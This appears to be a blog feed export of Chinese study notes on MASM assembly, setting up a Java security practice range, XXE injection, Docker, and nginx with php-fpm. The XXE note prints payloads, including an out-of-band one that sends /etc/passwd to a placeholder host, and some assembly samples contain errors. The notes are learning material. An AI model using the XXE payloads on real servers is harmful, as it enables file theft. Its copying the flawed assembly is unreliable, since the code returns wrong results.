.386.model flat,stdcalloption casemap:noneGetStdHandle proto nStdHandle:dwordReadFile proto  hFile:dword,		lpBuf:dword,		notr:dword,		lobr:dword,		lol:dwordWriteFile proto  hFile:dword,		lpBuf:dword,		notr:dword,		lobr:dword,		lol:dwordSTD_INPUT_HANDLE = -10STD_OUTPUT_HANDLE = -11INVALID_HANDLE_VALUE = 0FFFFFFFFHBUF_LEN = 255.data	msg db &quot;Type a line and press Enter, or q to quit: &quot;,00dh,00ah ;00dh,00ah 为\r\n	msg_len db $-msg	chBuffer db BUF_LEN dup(0).codemain proc_start::	_hout$ = -16	_hin$ = -12	_cRead$ = -8	_cWritten$ = -4	push ebp	mov ebp,esp	sub esp,16 ;给局部变量留空间	invoke GetStdHandle,STD_INPUT_HANDLE	mov _hin$[ebp],eax	invoke GetStdHandle,STD_OUTPUT_HANDLE	mov _hout$[ebp],eax		mov ebx,_hin$[ebp]	cmp ebx,INVALID_HANDLE_VALUE	mov ebx,_hout$[ebp]	je InvalidError	cmp ebx,INVALID_HANDLE_VALUE	je InvalidErrorinfloop:	invoke WriteFile,_hout$[ebp],offset msg,msg_len,addr _cWritten$[ebp],00h	cmp eax,0	je InvalidError	invoke ReadFile,_hin$[ebp],offset chBuffer,255,addr _cRead$[ebp],00h	cmp eax,0	je NormalEnd	lea edi,chBuffer	mov al,[edi]	cmp al,071h	je NormalEnd	jmp infloopNormalEnd:	add esp,16	xor eax,eax	pop ebp	retInvalidError:	add esp,16	mov eax,1	pop ebp	retmain endpend _start

思考:系统调用&#x2F;API是什么，程序员为什么通常要了解特定系统的系统调用&#x2F;API？
​	系统调用:是内核提供的底层接口，通过软中断（如 int 0x80）或专用指令（如 syscall）触发
​	API：应用程序接口，是高级语言对系统调用的封装，可能涉及多个系统调用。
​	不同的操作系统有不同的系统调用，不了解他们会使自己写的程序不具有跨平台移植性
​	同时，系统调用是别人造好的轮子；用别人造好的轮子，写程序更加方便高效
什么是HANDLE？有什么用？
句柄，用来标识对象的标识符，用来描述窗口，文件等
句柄隐藏了资源的具体实现细节，应用程序只需通过句柄与资源进行交互，而无需关心资源的存储位置和内部结构，这使得资源管理更加简单和高效
模块化编程要点与高级语言类似，将不同的功能拆分到不同的.asm文件中
汇编的主程序入口是end后的标号，所以在子程序模块中的.code段中，end后就不能再跟上标号或者段名
子程序中需要声明子程序段为public,否则其他程序段可能就无法调用该子程序
调用者中使用proto引用子程序，引用格式与声明格式保持一致(proc -&gt; proto)
以addxy为例
int addxy(int x,int y);

addxy.asm声明方法1
.386.model flat,stdcalloption casemap:none.datapublic addxy ;这样才能在其他文件中被调用.codeaddxy proc stdcall x:dword,y:dword	push ebp	mov ebp,esp	mov eax,x	add eax,y	xor eax,eax	pop ebp	ret 8 ;stdcall规定由被调用者平衡堆栈addxy endpend

addxy.asm声明方法2
.386.model flat,stdcalloption casemap:none.datapublic addxy.codeaddxy proc	_x$ = 8	_y$ = 12	push ebp	mov ebp,esp	mov eax,_x$[ebp]	add eax,_y$[ebp]	pop ebp	ret 8 ;stdcall规定由被调用者平衡堆栈addxy endpend

main.asm
对于第一种声明方式
.386.model flat,stdcalloption casemap:noneaddxy proto stdcall x:dword,y:dword ;引用与声明格式一致，最好使用proto引用.data.codemain proc_start::	push ebp	mov ebp,esp	invoke addxy,4,5	xor eax,eax	pop ebp	retmain endpend _start

对于第二种声明方式
.386.model flat,stdcalloption casemap:noneaddxy proto ;或extrn addxy:proto.datax dd 5y dd 6.codemain proc_start::	push ebp	mov ebp,esp	push y	push x	call addxy	xor eax,eax	pop ebp	retmain endpend _start

例题编写汇编程序完成以下的C语言代码的功能
int addxy(int x,int y)&#123;  return x+y;&#125;int main()&#123;    int x;    int y;    int sum;    scanf(&quot;%d&quot;,&amp;x);    scanf(&quot;%d&quot;,&amp;y);    sum=addxy(x,y);    printf(&quot;%d&quot;,sum);    return 0;&#125;

func.asm
.386.model flat,stdcalloption casemap:noneGetStdHandle proto stdcall nStdHandle:dwordpublic func.codefunc proc stdcall nStdHandle:dword	invoke GetStdHandle,nStdHandle	retfunc endpend

input.asm
.386.model flat,stdcalloption casemap:noneSTD_INPUT_HANDLE = -10INVALID_HANDLE_VALUE = 0FFFFFFFFHBUF_LEN = 255func proto stdcall nStdHandle:dwordReadFile proto stdcall hFile:dword,lpBuffer:dword,nNumberOfBytesToRead:dword,lpNumberOfBytesToRead:dword,lpOverlapped:dword.data	buf db BUF_LEN dup(0)public input.codeinput proc stdcall var_addr:dword	;局部变量在堆栈中偏移量	_lol$ = -20	_lobr$ = -16	_lobt$ = -12	_buf$ = -8	_hfile$ = -4	push ebp	mov ebp,esp	sub esp,20	;获取句柄	invoke func,STD_INPUT_HANDLE	mov _hfile$[ebp],eax	push esi	lea esi,buf	;取buf的地址送入堆栈	mov _buf$[ebp],esi	pop esi		invoke ReadFile,_hfile$[ebp],addr buf,BUF_LEN,addr _lobr$[ebp],00h	mov ecx,_lobr$[ebp]	push esi	lea esi,buf	push ebx	push edx	mov dl,10	xor eax,eax	mov dh,00dh	;将输入的字符串转换为数字convert:	cmp [esi],dh	je end_convert	xor ebx,ebx	mov bl,[esi]	sub bl,030h	imul dl	add eax,ebx	inc esi	loop convertend_convert:	pop edx	pop ebx	pop esi	add esp,20	pop ebp	;将转换结果再传给参数指向的值	mov ebx,[var_addr]	mov [ebx],eax	ret 4input endpend

output.asm
.386.model flat,stdcalloption casemap:noneSTD_OUTPUT_HANDLE = -11INVALID_HANDLE_VALUE = 0FFFFFFFFHBUF_LEN = 255func proto stdcall nStdHandle:dwordWriteFile proto stdcall hFile:dword,lpBuffer:dword,nNumberOfBytesToRead:dword,lpNumberOfBytesToRead:dword,lpOverlapped:dword.data	buf db BUF_LEN dup(0)public output.codeoutput proc stdcall var:dword	_lol$ = -20	_lobw$ = -16	_lobt$ = -12	_buf$ = -8	_hfile$ = -4	push edx	push eax	push ebx	push ecx	push esi	xor edx,edx	xor ecx,ecx	xor ebx,ebx	mov eax,var	mov ebx,10	lea esi,buf;将数字重新转换成字符，采用压栈逆序转换convert:	cmp eax,0	je popBuf	xor edx,edx	div ebx	add edx,030h		push edx	inc ecx	jmp convertpopBuf:	pop edx	mov [esi],dl	inc esi	loop popBufwriteFile:	mov ecx,00h	mov [esi],ecx	pop esi	pop ecx	pop ebx	pop eax	pop edx	push ebp	mov ebp,esp	sub esp,20	invoke func,STD_OUTPUT_HANDLE	mov _hfile$[ebp],eax	push esi	lea esi,buf	mov _buf$[ebp],esi	pop esi	invoke WriteFile,_hfile$[ebp],addr buf,BUF_LEN,addr _lobw$[ebp],00h	add esp,20	pop ebp	ret 4output endpend

addxy.asm
.386.model flat,stdcalloption casemap:none.datapublic addxy.codeaddxy proc stdcall x:dword,y:dword,sum:dword ;传址	mov eax,x	add eax,y	mov ecx,sum	mov [ecx],eax	ret 12addxy endpend 

main.asm
.386.model flat,stdcalloption casemap:noneaddxy proto stdcall x:dword,y:dword,sum:dwordinput proto stdcall var_addr:dwordoutput proto stdcall var:dword.data.codemain proc_start::	_x$ = -12	_y$ = -8	_sum$ = -4	push ebp	mov ebp,esp	sub esp,12		invoke input,addr _x$[ebp]	invoke input,addr _y$[ebp]	invoke addxy,_x$[ebp],_y$[ebp],addr _sum$[ebp]	invoke output,_sum$[ebp]	add esp,12	xor eax,eax	pop ebp	retmain endpend _start

]]></content>
      <categories>
        <category>汇编</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS7上搭建Hello-Java-Sec靶场踩坑以及解决</title>
    <url>/2025/06/20/CentOS7%E4%B8%8A%E6%90%AD%E5%BB%BAHello-Java-Sec%E9%9D%B6%E5%9C%BA%E8%B8%A9%E5%9D%91%E4%BB%A5%E5%8F%8A%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[CentOS7上搭建Hello-Java-Sec靶场踩坑以及解决ssh工具:WindTerm(用它是觉得它比较好看qaq)
搭建靶场的部分参考了这篇博客:https://blog.csdn.net/2301_81881972/article/details/142637755
从Github克隆到本地没安装git要先安装git，我直接使用yum进行安装
yum install -y git

然后
git clone https://github.com/j3ers3/Hello-Java-Sec

但是报错

测试与github的网络连通性，发现ping得通

使用curl命令尝试，也没有问题
curl -v https://github.com


一开始怀疑是不是openssl太旧了，但是不是
尝试使用ssh进行git clone
git clone git@github.com:j3ers3/Hello-Java-Sec.git

报错:

原因是本机没有配置ssh key
生成ssh key使用ssh-keygen生成，使用RSA加密算法
ssh-keygen -t rsa -b 4096 -C &quot;github绑定的邮箱地址&quot;

生成的ssh key位于~/.ssh/id_rsa.pub

github首页-&gt;个人头像-&gt;Settings-&gt;SSH and GPG keys-&gt;New SSH key



进行测试ssh -T git@github.com

如果返回字样:Hi 你的GitHub账户名! You&#39;ve successfully authenticated, but GitHub does not provide shell access.
就说明成功了，可以继续克隆靶场到本地
Maven环境问题一开始配置安装maven时直接使用yum进行安装
yum install -y maven

进入靶场目录
cd Hello-Java-Sec


然后进行maven编译安装
mvn clean package -DskipTests

编译了半天，最后报错了…

找了半天原因,还以为是pom.xml中依赖存在问题
其实是yum下载的maven版本太低了
原先通过yum下载的maven版本:
解决先把原来的maven删了
yum remove maven -y

我是去官网下载tar.gz包到win电脑上，再通过rz命令传到虚拟机中，再进行配置
下载Binary zip archive这个版本
解压缩
tar -xzvf ./apache-maven-3.9.10-bin.tar.gz

将解压缩后的apache-maven-3.9.10移到&#x2F;opt下
mv ./apache-maven-3.9.10 /opt/

配置环境变量
echo &#x27;export MAVEN_HOME=/opt/apache-maven-3.9.6&#x27; &gt;&gt; ~/.bashrcecho &#x27;export PATH=$MAVEN_HOME/bin:$PATH&#x27; &gt;&gt; ~/.bashrc

重新加载
source ~/.bashrc

现在mvn命令能用了，但是不完全能用,为什么呢?
能用是因为可以通过&#x2F;opt&#x2F;apache-maven-3.9.10&#x2F;bin&#x2F;mvn使用mvn命令，但是因为&#x2F;usr&#x2F;bin中没有mvn,直接使用mvn会报错:没有这个命令
我们需要创建一个软链接
ln -s /opt/apache-maven-3.9.10/bin/mvn /usr/bin/mvn

这样就可以用了
测试一下

可以看到版本成功更新到了3.9.10
现在重新编译maven就没问题了

]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
        <tag>Maven</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE学习笔记</title>
    <url>/2024/09/11/XML%20&amp;&amp;%20XXE/</url>
    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
XML与HTML的不同与html区别：html表示与数据相关，XML更多用于数据传输、存储
XML结构
&lt;?xml version=&quot;1.0&quot;?&gt;表示版本号，xml处理解析时的规范&lt;Person&gt;...&lt;/Person&gt;表示根元素，XML文档需有且仅有一个根元素根元素内有两个赋值的嵌套标签子元素&lt;Name&gt;&lt;/Name&gt;,&lt;Age&gt;&lt;/Age&gt;

注意：元素标签名对大小写敏感

上述单独字符不能直接出现，会被错误解析
实体（ENTITIY）ENTITY就像XML中的变量，可以对其进行赋值，在XML文档的其他地方进行引用，实体在XML的文档类型定义部分（DTD）被单独定义描述
XML 文档的根元素通常与 DTD 中定义的根元素名称相匹配
 
&lt;!DOCTYPE Person [	&lt;!ENTITY name &quot;XXX&quot;&gt;]&gt;&lt;Person&gt;    &lt;Name&gt;&amp;name;&lt;/Name&gt;    &lt;Age&gt;20&lt;/Age&gt;&lt;/Person&gt;前面的DOCTYPE表示这是一个DTD，用ENTITTY定义了一个叫做name的实体，赋值为XXX;后面可以直接用&amp;跟上实体名引用这个实体，可以防止重复赋值



DTD分类DTD并不是XML文档的一部分，它们总是在根元素的定义之上-&gt;DTD像实体一样可以从外部加载

一般实体&#x2F;通用实体（general entities）
  如上面的那个实体
  引用外部dtd：
  解析器将从这个外部dtd中提取并解析内容
  &lt;!DOCTYPE Pwn SYSTEM &quot;xxx.dtd&quot;&gt; dtd的URI&lt;Pwn&gt;test&lt;/Pwn&gt; 是 XML 文档的根元素，它的名字与 DOCTYPE 声明中的名称相匹配。这意味着 Pwn 是这个 XML 文档的根元素，它包含的文本是 test。


参数实体
  必须定义在单独的dtd区域内，参数实体只能在同一个DTD中调用
  比如，用一个实体给另外一个实体赋值
  &lt;!ENTITY % outer &lt;!ENTITY inner  &quot;xxx&quot;&gt;&gt;

  ​	常用于XXE（外部实体注入）
  dtd中调用参数实体
  参数实体只能在同一个DTD中调用！！！
  &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE Pwn[	&lt;!ENTITY % outer &quot;&lt;!ENTITY inner SYSTEM &#x27;xxx&#x27;&gt;&quot;&gt;	%outer;]&gt;&lt;Pwn&gt;&amp;inner;&lt;/Pwn&gt;

  
  XML调用DTD中实体参数的大概流程：XML解释器发现这段代码时，先检查版本；然后发现dtd，这个dtd在xml文档中，可以叫做内联dtd，%开头的是参数实体标志，%outer的值是inner中解析出的东西；调用被赋值的%outer相当于

预定义实体
  某些特殊符号的一组预定义数值集，这些特殊符号有可能会破坏XML结构（报错），可以选择用其他形式比如十六进制表示这类符号
  &lt;test&gt;&amp;#x3C;&lt;/test&gt; 这一串十六进制表示了&lt;

XML安全性问题
ENTITY  实体可以被赋值（存储数据），但是实体功能不止这个，外部实体就是其中一个功能。
  实体不仅能用来存储指定数值，还可以从本地文件或远程网络中调取相关数据，作为后续实体引用，但是这样带来了广泛的攻击面
  比如：
  &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE XXE[&lt;!ENTITY subcribe SYSTEM &quot;secret.txt&quot;&gt;]&gt;&lt;pwn&gt;&amp;subscribe;&lt;/pwn&gt;

  SYSTEM表示后面的内容是外部实体；
  如果外部实体长得是标签或者和XML很像的东西，XML解析器会报错；
  这样的实体赋值并不是secret.txt，而是其中的内容，XML在此接收任意有效的URI包括文件，HTTP，ftp和其他协议形式的内容
  外部实体读取了数据，这种就是外部实体注入攻击（XXE）
外部实体注入攻击（XXE）分类带内数据  上面的示例涉及的就是带内XXE；
  XML解析后的输出会直接显示在屏幕上
基于错误  解析结果只有错误信息（类似Blind XXE）
带外数据  OOB；真正的盲注，XML解析后无任何输出响应（无回显），必须执行一些带外请求把目标数据提取出来
  场景：
  
  有一个能解析XML但是没有任何输出响应的web应用，为了测试这种盲注XXE，我们可以用非文件路径的外部实体来请求这里的web应用，可以用dns平台监听web应用是否解析了XML，也可以用自己构造好的网站（SYSTEM后的外部实体URL为测试的地方）



如果监听到了，就说明XML被成功解析，目标web应用正在尝试获取我们构造的网站上的资源作为外部实体，这样我们可以利用受害者的身份发起请求（服务器端请求伪造（SSRF））
Payloadeg：

&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE XXE[&lt;!ENTINY %passwd SYSTEM &quot;/etc/passwd&quot;&gt;&lt;!ENTINY %wrapper &quot;&lt;!ENTINY send SYSTEM &#x27;http://xxx.com/?passwd;&#x27;&gt;&quot;&gt;%wrapper;]&gt;&lt;pwn&gt;send;&lt;/pwn&gt;XML解释器会先解析/etc/passwd的内容赋值到参数实体%passwd中，然后解析URL中的内容赋给实体send，send再赋给参数实体%wrapper但是这样会报错，根据xml规范， dtd内部子集的参数实体调用不能在实际的标记语言（html，svg等）中来调用参数实体，但是可以在同级别中被当作标记语言调用，外部参数实体不受此限制，可以借助外部dtd绕过这个限制


比如payload形式为：
&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data SYSTEM &quot;/xxx/xx/x/test.dtd&quot;&gt;;&lt;data&gt;&amp;send;&lt;/data&gt; 莫名冒出来的send实体就来自外部的dtd



%passwd最终会变成URL的一部分

]]></content>
      <categories>
        <category>Web安全</category>
        <category>XXE &amp;&amp; XML</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XXE &amp;&amp; XML</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker</title>
    <url>/2025/01/06/docker/</url>
    <content><![CDATA[初识Docker环境为Ubuntu

docker就是用于解决软件跨环境迁移的问题，docker简单来说就是装了软件及其运行环境的容器


ps:md,docker好几个源都不好用，我的&#x2F;etc&#x2F;docker&#x2F;daemon.json配置如下
/*配置如下*/&#123;  &quot;registry-mirrors&quot;: [    &quot;https://hub.fast360.xyz&quot;,    &quot;https://hub.rat.dev&quot;,    &quot;https://hub.littlediary.cn&quot;,    &quot;https://docker.kejilion.pro&quot;,    &quot;https://dockerpull.cn&quot;,    &quot;https://docker-0.unsee.tech&quot;,    &quot;https://docker.tbedu.top&quot;,    &quot;https://docker.1panelproxy.com&quot;,    &quot;https://docker.melikeme.cn&quot;,    &quot;https://cr.laoyou.ip-ddns.com&quot;,    &quot;https://hub.firefly.store&quot;,    &quot;https://docker.hlmirror.com&quot;,    &quot;https://docker.m.daocloud.io&quot;,    &quot;https://docker.1panel.live&quot;,    &quot;https://image.cloudlayer.icu&quot;,    &quot;https://docker.1ms.run&quot;  ],  &quot;insecure-registries&quot;: [],  &quot;debug&quot;: false,  &quot;experimental&quot;: false,  &quot;features&quot;: &#123;    &quot;buildkit&quot;: true  &#125;,  &quot;log-driver&quot;: &quot;json-file&quot;,  &quot;log-opts&quot;: &#123;    &quot;max-size&quot;: &quot;10m&quot;,    &quot;max-file&quot;: &quot;3&quot;  &#125;&#125;



Docker架构与容器化

比如想在docker主机上运行MySQL，在docker客户机上拉取MySQL镜像（docker pull MySQL），然后docker主机就会在应用市场&#x2F;仓库中下载MySQL镜像；
客户机上运行MySQL，执行run命令(docker run MySQL)，就会创建容器，容器中放着一个或者多个应用

也可以制作自己的镜像，docker build xxx,会放在docker主机的image中，也可以将这个镜像上传到应用市场中，
docker push xxx
命令命令-镜像操作
eg：下载一个nginx
先查看仓库中有没有nginx的镜像，sudo docker search nginx（search不走配置的镜像源所以会超时，在镜像名前加上 register.liberx.info/可以解决超时问题）
然后拉到docker主机，sudo docker pull nginx,pull默认是下载最新版本，下载指定版本nginx:版本号
查看自己的镜像列表：sudo docker images&#x2F;sudo docker image ls
命令-容器操作
查看运行中&#x2F;所有容器： sudo docker ps [-a]加上-a就会显示所有容器

UP表示上线，EXITED表示结束运行
sudo docker start/stop/stats后面加的是容器名字或者容器的id（id不一定全部输完只要能区分就行，但是名字不能模糊匹配）

删除容器：sudo docker rm [-f] 容器名/容器id，不加-f那么需要停止容器再删除，-f表示强制删除
可以用$传入id
sudo docker rm -f $(sudo docker ps -aq) -aq是显示所有容器的ID
命令-run，exec运行的docker容器名字一坨，一run就阻塞终端，怎么办？
sudo docker run -d --name 想要指定的容器名 镜像名

-d表示后台运行，–name（是两个杠）给容器指定一个名字
既然占用80端口了，计网里学的80是web服务端口，那么想必可以可以用浏览器访问吧

虽然nginx运行了，还占用的80端口（web服务默认端口），但是在浏览器直接访问docker host的ip行不通

为什么会这样呢？


原因是占用的80端口只是容器的80端口而不是主机的80端口（前面说的容器就像一个更简化的虚拟机，内部的端口自然与外部主机的端口不一样），所以我们需要进行端口映射
-p 外部端口:内部端口（非常重要！！！！！）

将主机的80端口映射到容器的80端口
这下访问到nginx的主页了

怎么修改默认的这个页面呢？dockerhub中会描述镜像的默认初始页面（usr&#x2F;share&#x2F;nginx&#x2F;html）（我上不去啊）
sudo docker exec -it 容器名 /bin/bash  -it表示交互模式，&#x2F;bin&#x2F;bash表示以终端方式进入这个容器

exit退出
命令-镜像操作
sudo docker commit [选项] 选定容器 镜像
-a, --author：设置镜像作者信息。-c, --change：应用 Dockerfile 指令来创建镜像。-m, --message：提交时的说明信息。-p, --pause：在提交之前暂停容器的运行（默认为 true）

比如将前面的运行nginx的容器提交为新镜像
sudo docker commit -m &quot;commit-test&quot; -a &quot;wwwtty&quot; myNginx committest

镜像保存为一个tar文件
sudo docker save [-o 文件名.tar] 镜像名
sudo docker load -i tar包名字
load下来后就是一个镜像，直接run就可以启动容器


sudo docker login
需要有dockerhub账号
sudo docker tag 原镜像名 目标镜像名
sudo docker push 目标镜像名
存储容器内部对文件修改困难（没有vi&#x2F;vim），而且如果容器炸了或者容器重新启动就丢失修改
目录挂载

外部的目录像u盘一样 -v 外部目录:内部目录
比如将~下的html目录作为外部目录,nginx默认页面所在目录作为内部目录
sudo docker run -d --name test -p 80:80 -v ~/html:/usr/share/nginx/html nginx
这样访问服务器ip出来的就是自己预设的页面
卷映射如果想通过修改外部文件就能实现对内部配置文件的修改，需要使用卷映射
为什么不能使用目录挂载呢，因为目录挂载如果目录不存在，会先在外部创建一个空文件夹，那么挂载空文件夹，相当于启动时配置项全是空的，就启动不了容器
-v 卷名:容器中配置文件路径
卷的位置 /var/docker/volumes/卷名
显示所有的卷：sudo docker volume ls
创建卷：sudo docker volume create 卷名
显示卷的详细信息：sudo docker volume inspect 卷名
网络容器间访问怎么实现一个容器访问另一个容器？




1.可以通过run的-v端口映射
我有以下两个run起来的容器

假设从test1访问test
 sudo docker exec -it test1 bash 
sudo curl 175.27.249.106:80 
终端就会出现html

但是这样做很奇怪，相当于从test1的88端口-&gt;docker host的80端口-&gt;test的80端口，绕了一大圈
有一个叫做docker0的默认网络



查看容器细节：sudo docker container inspect 容器名/sudo docker inspect 容器名

接下来就可以通过显示出的IP地址进行访问（docker为每个容器分配唯一IP，通过ip+容器端口可以互相访问）
从test0访问test1

ubuntu@VM-0-9-ubuntu:~$ sudo docker exec -it test0 bashroot@8656267b120d:/# curl http://172.17.0.3:80 #test1容器的ip和端口


这样做也有缺点，ip是会变动的


创建自定义网络
创建mynet：sudo docker network create mynet

将容器加入自己的网络下（–network 网络名） sudo docker run -d --name test0 -p 80:80 --network mynet nginx
sudo docker inspect test0:

这样一来，容器间访问只需要进入容器-&gt;curl http://容器名:容器端口
Docker compose

上线：第一次创建并启动
下线：移除创建的容器以及相关资源
不用compose.yaml启动wordpress和mysql
#启动mysqldocker run -d -p 3306:3306 \-e MYSQL_ROOT_PASSWORD=123456 \-e MYSQL_DATABASE=wordpress \-v mysql-data:/var/lib/mysql \-v /app/myconf:/etc/mysql/conf.d \--restart always --name mysql \--network blog \mysql:8.0#启动wordpressdocker run -d -p 8080:80 \-e WORDPRESS_DB_HOST=mysql \-e WORDPRESS_DB_USER=root \-e WORDPRESS_DB_PASSWORD=123456 \-e WORDPRESS_DB_NAME=wordpress \-v wordpress:/var/www/html \--restart always --name wordpress-app \--network blog \wordpress:latest

compose.yaml格式：
name:项目名services:	应用名:		container_name: 容器名（不指定默认:项目名_应用名）		environment:			环境配置（docker run的-e），格式如 - WORDPRESS_DB_HOST=mysql 或 WORDPRESS_DB_HOST: mysql		networks:			- 网络名		ports:			- &quot;端口映射&quot;		restart:			always /……		volumes:			- 目录挂载或卷映射networks:	网络名:		更详细的配置volumes:	卷名:		更详细的配置

启动(上线)命令：sudo docker compose -f compose.yaml up -d
-d:后台运行
-f:指定yaml文件
下线命令：sudo docker compose -f compose.yaml down
如果更改了compose.yaml文件的配置，重新上线，没有被更改的应用会保持running状态；
下线并不会移除对应的卷
Dockerfiledockerfile制作镜像

比如将app.jar打包成镜像
FROM openjdk:17LABEL author=wwwttyEXPOSE 8080 #容器暴露8080端口COPY app.jar /app.jar #容器相当于一个新的操作系统要放在根目录下ENTRYPOINT java -jar app.jar#更推荐下面的写法ENTRYPOINT [&quot;java&quot;,&quot;-jar&quot;,&quot;/app.jar&quot;]

制作镜像命令：docker build -f dockerfile -t 镜像名:版本 ./要指明当前的目录.&#x2F;
镜像分层存储

使用docker history 镜像名查看容器构建历史（过程自下而上）
也可以使用 docker image inspect 镜像名查看更详细的信息
官方的nginx镜像（docker history）：

（docker image inspect）展现的层级:

进行目录挂载后的容器再commit的镜像：

发现多了1.09kb
（docker image inspect）展现的层级:

比官方的多了一层，多的一层就是挂载的目录
分层视角下的容器与镜像


容器就是在镜像层（只读）加上一层读写层，对容器的修改都是在可读可写层进行，所以删除容器修改都会丢失（因为读写层没了）
这样的好处是容器隔离：

可以用 docker ps -s/--size 查看读写层和只读层的关系

SIZE列 前面是读写层大小括号内是镜像大小
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Docker搭建Nginx以及PHP-fpm</title>
    <url>/2025/01/17/docker%E6%90%AD%E5%BB%BAnginx+php-fpm/</url>
    <content><![CDATA[前言想自己搭建靶场所以学习docker+nginx+php，但是这两天一直卡在配环境上，踩了许多的坑最终才完成环境的配置
参考了docker部署php和nginx环境_docker nginx php-CSDN博客
编辑文件如果不喜欢用vim，可以用vscode远程连接然后打开文件夹进行文件编辑等操作
参考：vscode连接远程服务器（傻瓜式教学）-CSDN博客
OS：centOS 7.9 64位
要点
最好是自己创建一个网络，把php容器和nginx容器都加入该网络中（做了这步就很神奇的可以解析php了）
自己创建目录结构尽量明了
nginx容器的根目录路径和php容器的根目录路径要挂载到同一目录
php.ini需要自己创建
挂载后根目录中要有index.html等默认页面，不然会报403（刚遇到让人一头雾水）
nginx的default.conf和nginx.conf一定要配置正确
有问题多看日志，多拿错误日志信息问问ai（

过程创建自己的网络docker network create mynet


 后续php容器，nginx容器加入该网络
创建辅助容器创建php和nginx两个容器，用于复制配置文件(仅仅用于辅助，我就没进行端口映射)
docker run -d --name nginx nginxdocker run -d --name php php:7.3-fpm



1.参数说明：-d 后台运行 –name 给容器取个名字


路径设置


使用docker cp命令：
将容器中路径的内容复制到docker host路径中
docker cp 容器名:路径 目的路径
nginx的配置文件位于&#x2F;etc&#x2F;nginx
nginx的日志文件位于&#x2F;var&#x2F;log
php配置文件位于&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php

编辑

将nginx和php的配置文件复制到主机的&#x2F;data下，nginx的日志文件复制到&#x2F;data&#x2F;nginx

mkdir /datacd /data#nginxdocker cp nginx:/etc/nginx ./docker cp nginx:/var/log ./nginx



 用tree &#x2F;data看一下目录层级有没有正确
如果没有安装tree
yum install tree


编辑
复制php配置文件
编辑

进入php容器，可以用:
php -i | grep php.ini
得到配置文件路径
&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php

#php (工作路径处于/data下)docker cp php:/usr/local/etc/php ./


做完以上操作后，目录层级结构如下：

编辑
做完这些，我们需要将php.ini-development或者php.ini-production中的其中一个改成php.ini
#工作路径/datamv ./php/php.ini-development ./php/php.ini


 修改后如下
编辑
然后我们需要有一个工作目录用来挂载初始页面目录,并且放一个index.html进去（不然到时候会403）
mkdir ./wwwtouch ./www/index.html


 目录层级如下
 编辑
删除辅助容器#加上-f就不用先停止容器docker rm -f $(docker ps -aq)


创建新容器nginx：docker run \-d --name nginx \-p 80:80 \-v /data/nginx/nginx.conf:/etc/nginx/nginx.conf \-v /data/nginx/conf.d/default.conf:/etc/nginx/conf.d/default.conf \-v /data/nginx/log:/var/log/nginx \-v /data/www:/usr/share/nginx/www \--network mynet \nginx



\1.    我新建了初始页面目录&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www（原本的初始页面目录为&#x2F;usr&#x2F;share        &#x2F;nginx&#x2F;html）,将它挂载到我们创建好的工作目录&#x2F;data&#x2F;www下
\2.    配置文件一定要正确挂载
\3.    –network表示加入自己创建的网络mynet

php：docker run \-d --name php \-p 9000:9000 \-v /data/php/php.ini:/usr/local/etc/php/php.ini \-v /data/www:/usr/share/nginx/www \--network mynet \php:7.3-fpm



\1.    php和nginx的初始页面必须挂载到同一路径
​      所以在php和nginx的容器内都新建了&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www
\2.    –network表示加入自己创建的网络mynet

修改配置文件修改default.conf#原本的default.confserver &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    location / &#123;        root   /usr/share/nginx/html;        index  index.html index.htm;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    #location ~ \.php$ &#123;    #    root           html;    #    fastcgi_pass   127.0.0.1:9000;    #    fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;    #    include        fastcgi_params;    #&#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;



我们需要更改：

将root改为之前设置的初始页面路径&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www
在location \块中，index中增加index.php
将location ~ .php$块中的fastcgi_pass改成 php容器名:9000
fastcgi_param那一行改成：fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;


#修改后的default.confserver &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    root /usr/share/nginx/www;    location / &#123;        # root   /usr/share/nginx/html;        # index  index.html index.htm;        index index.php index.html;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        # root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    location ~ \.php$ &#123;    #    root           html;       fastcgi_pass   php:9000;       fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;       include        fastcgi_params;    &#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    